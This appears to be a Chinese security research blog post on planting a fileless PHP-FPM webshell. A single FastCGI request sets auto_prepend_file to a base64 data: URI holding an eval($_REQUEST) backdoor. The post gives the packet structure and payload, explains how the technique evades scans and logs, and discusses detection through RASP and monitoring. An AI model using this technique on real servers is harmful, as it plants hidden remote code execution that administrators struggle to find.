# 利用 PHP-FPM 做内存马的方法
******点击****蓝****字 / 关注我们******

前言
--

Java 内存马固然是极好的，可我略微瞟了一眼PHP 的占有率，虽然从我上次关注 PHP 10年都过去了，PHP 却仍然是最为主流的服务端 Web 语言。所以，为什么没人做 PHP 的内存马研究呢

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/68b697c7-7a8f-4795-ba2e-0c03363ac808.png?raw=true)

然而并不是没人做研究，可由于 PHP 语言的特性，他的一次执行生命周期，通常就是伴随着请求周期开始和结束的。因此，很难完成一段代码的内存长久驻留。目前网上如果搜索“PHP 内存马”，通常会发现两种模式：

1.  “不死”马：所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码。
    
2.  Fastcgi马：这个利用了 PHP-FPM 可以直接通过 fastcgi 协议通讯的原理，可以指定`SCRIPT_FILENAME`，去执行机器上存在的 PHP 文件；或者配合`auto_prepend_file+php://input`，通过每次提交POST code去执行。（稍微感叹一下，这个问题从我写fcgi_exp的代码，已过了整整10年）
    

然而，方案1，非常的ugly，阻塞进程不说，而且很多时候还是要本地落盘文件，只是想让管理员删不掉罢了。而方案2，仔细看，却只是对 FPM 未授权访问的漏洞利用而已。甚至更不能算作是内存马的概念。这两者本质上都是受限于“PHP 代码无法长久驻留内存执行”这个问题。因此，关于 PHP 的内存马研究，大部分的时候也就只能止步于此了。

方案
--

现在，让我们聚焦一下，我们究竟想要达到一个什么样的目标：所谓内存马，最主要是为了避免后门文件落盘，让后门代码在内存中驻留，并且可以通过特定的方式访问，即可触发执行。从这个描述中，我们可以看出，隐藏是最核心的诉求。尤其是为了在高等级的对抗过程中，避免管理员从各类文件扫描、流量特征、行为日志中检测出来。内存马只能从进程本身的空间中做检测，传统的旁路检测很难做到这一点。为此，什么通用性，重启即丢失等问题，通通无所谓。所以，我们把需求拆解一下，实际上要解决的两个问题：

1.  让后门代码在内存中驻留。
    
2.  可以通过“正常”的请求手段，触发执行。
    

我们来想法解决这个问题。其实，从 PHP-FPM 这个 fastcgi server 的实现上，我们就可以知道，本身这个 FPM 的进程就是持久化的，并且并不会如传统 CGI 模式一样，处理一个请求就会消亡。因此，我们只要能在这个进程上下文中保存信息，就算解决了问题。事实上，可能很多人并不知道，**在一次 fastcgi 请求中，任何通过 PHP\_VALUE/PHP\_ADMIN_VALUE 修改过的PHP配置值，在此 FPM 进程的生命周期内，都是会保留下来的。** 于是，真正的方法其实很简单，我们只需要把前面提到的外部方案2略微改一下即可。触发方式延续着之前的`auto_prepend_file`的方案，但由于我们是想要内存马，我们不再沿用`php://input`，否则还得每次都得提交代码，而是替换成`data`协议固定下来。假设在我们获取到一个 Web 的权限后——甚至我们可能只需要一个 SSRF 漏洞即可——我们只需要往 fpm 监听的端口发送如下结构的内容（这里是我本机测试）：

` array(15) {  
  ["GATEWAY_INTERFACE"]=>  
  string(11) "FastCGI/1.0"  
  ["REQUEST_METHOD"]=>  
  string(3) "GET"  
  ["SCRIPT_FILENAME"]=>  
  string(30) "/home/www/wofeiwo/t.php"  
  ["SCRIPT_NAME"]=>  
  string(14) "/wofeiwo/t.php"  
  ["QUERY_STRING"]=>  
  string(0) ""  
  ["REQUEST_URI"]=>  
  string(14) "/wofeiwo/t.php"  
  ["DOCUMENT_URI"]=>  
  string(14) "/wofeiwo/t.php"  
  ["PHP_ADMIN_VALUE"]=>  
  string(102) "allow_url_include = On  
auto_prepend_file = \"data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\""  
  ["SERVER_SOFTWARE"]=>  
  string(13) "80sec/wofeiwo"  
  ["REMOTE_ADDR"]=>  
  string(9) "127.0.0.1"  
  ["REMOTE_PORT"]=>  
  string(4) "9985"  
  ["SERVER_ADDR"]=>  
  string(9) "127.0.0.1"  
  ["SERVER_PORT"]=>  
  string(2) "80"  
  ["SERVER_NAME"]=>  
  string(9) "localhost"  
  ["SERVER_PROTOCOL"]=>  
  string(8) "HTTP/1.1"  
}  
`

以上是 fastcgi 的通讯包大概结构内容。至于怎么构造这个包，可以参考这个代码自己来改写。我们看到，由于不需要`php://input`，我们只需要 GET 请求即可，并且，构造请求只需要随意给一个存在的 php 文件路径，无所谓内容是啥。一个发包搞定一切，我们的 payload 已经无文件植入了。由于使用了`auto_prepend_file`，因此我们只需要访问服务器上任意一个正常的 PHP 文件，无需任何修改，都能触发我们的内存马。我们访问个普通的 phpinfo.php 文件，看看是否能够稳定的固化我们的内存马。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/a827da5e-ff99-487d-94da-c4b76b981a8e.png?raw=true)

img

果然已经成功的把我们想要的payload植入了进去。这里我们payload使用的是`<?php @eval($_REQUEST[test]); ?>`的 base64。我们访问`phpinfo.php?test=echo(aaaaa);`看看效果，当然正常使用的时候我们可以更隐蔽。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/cf7a85d5-7a8e-431e-bc4a-edb23ab86373.png?raw=true)

img

当然，这个方案也有局限性，因为是内存马，所以他实际上是和PHP-FPM的 Worker 进程绑定的，因此，如果服务器上有多个Worker进程，我们就需要多发送刚才的请求几次，才能让我们的payload“感染”每一个进程。此外，我们还需要关注一个php-fpm.conf的配置:

> pm.max\_requests int 设置每个子进程重生之前服务的请求数。对于可能存在内存泄漏的第三方模块来说是非常有用的。如果设置为 '0' 则一直接受请求，等同于 PHP\_FCGI\_MAX\_REQUESTS 环境变量。默认值：0。

这个配置定义了每一个 worker 进程最大处理多少请求，就会自动重生。主要作用可能是避免内存泄露，但是一旦重生了，我们的内存马也就失效了。庆幸的是，默认是不会重生的。

检测
--

既然是内存马，因此我们无法从代码扫描中发现。并且由于他只是修改了内存中的 PHP 配置，我们也无法从`PHP.ini/.user.ini/php-fpm.conf`等文件内容中检测。真正添加内存马由于只需要对fpm监听的端口发送请求，因此也无法从webserver的accesslog中发现问题。但是我们是可以通过rasp之类的工具，通过检查`auto_prepend_file/auto_append_file/allow_url_inclue`配置的变化（虽然目前很多 rasp 也不会做这些操作）来做检测。另外，由于触发方式可以是任意一个 PHP 文件，所以，我们想从后续的访问行为中做检查也有一定难度，但是可以从网络流量中检查对应的后门 payload，或者从进程的行为中，来做检查。

扩展
--

关于 PHP-FPM 的内存马，暂时就说这么多。那么这里还有一些疑问可以扩展：\\1. mod_php模式下的内存马是否有可能实现？\\2. 触发是否有除了`auto_prepend_file/auto_append_file`之外的方案？\\3\. 如何做到持久化，避免重生或者重启之后的？我就不做一一展开了，有兴趣的朋友，可以延续着问题继续深入，欢迎讨论。
